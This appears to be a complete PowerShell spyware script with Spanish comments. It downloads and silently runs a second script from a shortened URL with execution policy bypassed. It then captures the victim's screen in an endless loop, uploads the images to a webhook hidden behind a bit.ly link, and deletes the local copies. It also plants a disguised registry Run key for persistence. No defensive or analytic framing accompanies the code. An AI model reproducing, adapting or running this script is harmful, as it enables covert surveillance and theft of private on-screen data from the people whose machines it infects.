# URL del webhook
$hookurl = "https://bit.ly/web_chupacabras"
$seconds = 30 # Intervalo entre capturas de pantalla
$a = 2 # Cantidad de capturas de pantalla por iteración

# Función para descargar y ejecutar el script principal
function DescargarYExecutarScriptPrincipal {
    $scriptUrl = "https://bit.ly/Screen_dc"
    $scriptPath = "$env:temp\script.ps1"
    if (-not (Test-Path $scriptPath)) {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
        # Agregar el webhook al final del script
        Add-Content -Path $scriptPath -Value "`$hookurl = '$hookurl'"
    }
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
}

# Verificar si el script principal existe y ejecutarlo
DescargarYExecutarScriptPrincipal

# Iniciar bucle de captura y envío de imágenes
While ($true){
    For ($i = 0; $i -lt $a; $i++){
        $Filett = "$env:temp\SC_$i.png"
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Width = $Screen.Width
        $Height = $Screen.Height
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    }
    For ($i = 0; $i -lt $a; $i++){
        $fileToSend = "$env:temp\SC_$i.png"
        $fileName = "SC_$i.png"
        $fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
        $contentType = "application/octet-stream"
        
        $headers = @{
            "Content-Disposition" = "attachment; filename=$fileName"
        }
        
        $response = Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -ContentType $contentType -Body $fileBytes
        
        # Comprobamos si la solicitud fue exitosa
        if ($response.StatusCode -eq 200) {
            Write-Host "Imagen $fileName enviada correctamente."
        } else {
            Write-Host "Error al enviar la imagen $fileName. Código de estado: $($response.StatusCode)"
        }
        
        Remove-Item -Path $fileToSend -Force
    }
    Start-Sleep $seconds
    # Verificar si el script principal existe, si no, descargarlo
    if (-not (Test-Path $scriptPath)) {
        DescargarYExecutarScriptPrincipal
    }
}

# Agregar entrada al Registro de Windows para ejecutar al iniciar sesión
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "sysw"
if (-not (Get-ItemProperty -Path $registryPath -Name $scriptName -ErrorAction SilentlyContinue)) {
    $scriptFullPath = (Get-Item -Path ".\$MyInvocation.MyCommand.Name").FullName
    Set-ItemProperty -Path $registryPath -Name $scriptName -Value "powershell.exe -ExecutionPolicy Bypass -File `"$scriptFullPath`""
}
